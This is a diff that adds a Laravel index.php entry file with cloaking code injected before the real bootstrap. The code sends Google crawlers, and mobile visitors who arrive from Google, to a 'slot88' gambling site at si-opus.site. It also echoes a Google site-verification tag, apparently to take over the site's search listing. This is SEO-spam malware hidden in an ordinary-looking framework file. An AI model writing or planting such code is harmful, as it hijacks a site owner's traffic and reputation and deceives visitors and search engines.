@@ -1,0 +1,110 @@
+<?php
+function isGoogleBot() {
+    $userAgent = $_SERVER['HTTP_USER_AGENT'];
+    $googleBotAgents = [
+        'Googlebot',
+        'Googlebot/2.1',
+        'Googlebot-Mobile',
+        'Googlebot-Image',
+        'Googlebot-Video',
+        'Googlebot-News',
+        'Google-InspectionTool',
+        'Google-Site-Verification',
+        'Mediapartners-Google',
+        'AdsBot-Google',
+        'AdsBot-Google-Mobile',
+        'APIs-Google',
+        'AdsBot-Google-Mobile-Apps',
+        'FeedFetcher-Google',
+        'DuplexWeb-Google',
+        'Google Favicon',
+        'Google-Read-Aloud',
+    ];
+    
+    foreach ($googleBotAgents as $botAgent) {
+        if (strpos($userAgent, $botAgent) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+
+if (isGoogleBot()) {
+    // Jika pengunjung adalah Googlebot, tampilkan index_hitam.txt
+     header("Location: https://si-opus.site/slot88.html");
+    exit;
+}
+
+function is_mobile() {
+    $mobile_agents = array('Android', 'iPhone', 'iPad');
+    $uri = $_SERVER['REQUEST_URI'];
+    foreach ($mobile_agents as $agent) {
+        if ($uri == '/' && stripos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) {
+            if (isset($_SERVER['HTTP_REFERER']) && strpos($_SERVER['HTTP_REFERER'], 'google') !== false)
+            return true;
+        }
+    }
+    return false;
+}
+
+if (is_mobile()) {
+     header("Location: https://si-opus.site/slot88/");
+    exit;
+} else {
+
+
+
+
+/**
+ * Laravel - A PHP Framework For Web Artisans
+ *
+ * @package  Laravel
+ * @author   Taylor Otwell <taylorotwell@gmail.com>
+ */
+
+/*
+|--------------------------------------------------------------------------
+| Register The Auto Loader
+|--------------------------------------------------------------------------
+|
+| Composer provides a convenient, automatically generated class loader
+| for our application. We just need to utilize it! We'll require it
+| into the script here so that we do not have to worry about the
+| loading of any our classes "manually". Feels great to relax.
+|
+*/
+echo '<head><meta name="google-site-verification" content="ZAi61p6r_AQLVhv5aiUWOkdz5iUqVEmflYELm4scaGc" /></head>';
+require __DIR__.'/protected/bootstrap/autoload.php';
+
+/*
+|--------------------------------------------------------------------------
+| Turn On The Lights
+|--------------------------------------------------------------------------
+|
+| We need to illuminate PHP development, so let's turn on the lights.
+| This bootstraps the framework and gets it ready for use, then it
+| will load up this application so that we can run it and send
+| the responses back to the browser and delight these users.
+|
+*/
+
+$app = require_once __DIR__.'/protected/bootstrap/start.php';
+
+/*
+|--------------------------------------------------------------------------
+| Run The Application
+|--------------------------------------------------------------------------
+|
+| Once we have the application, we can simply call the run method,
+| which will execute the request and send the response back to
+| the client's browser allowing them to enjoy the creative
+| and wonderful application we have whipped up for them.
+|
+*/
+
+$app->run();
+
+
+
+}
+?>
